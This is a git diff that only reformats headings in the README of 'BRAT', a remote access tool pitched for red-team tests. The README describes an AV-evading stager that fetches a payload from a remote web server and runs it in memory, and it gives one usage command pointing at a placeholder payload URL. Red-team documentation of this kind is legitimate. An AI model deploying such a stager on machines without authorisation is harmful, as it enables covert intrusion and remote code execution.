@@ -1,4 +1,5 @@
-##Brat
+BRAT
+=====
 
 A remote access tool for penetration/red team tests. Hosts no malicious code so is not flagged by AV. Useful for physical compromise of a host, as an SE payload, or as an initial stager/dropper.
 
@@ -8,7 +9,7 @@ Pre-compiled windows binaries are available in /bin. To build from source you wi
 
 Compile scripts are provided to use a starting point.
 
-## Usage
+### Usage
 
 The tool, once executed, makes an HTTPS GET request to a provided web server. The web server hosts the payload you wish to run. The binary loads this payload into memory and then executes it (NX is disabled on the binary). 
 
@@ -29,7 +30,7 @@ Then execute the binary on the target machine. The binary takes two command line
 
 ```./a.exe https://your-web-server/payload.txt 0```
 
-## TODO
+### TODO
 
 Build binaries against custom Curl
 
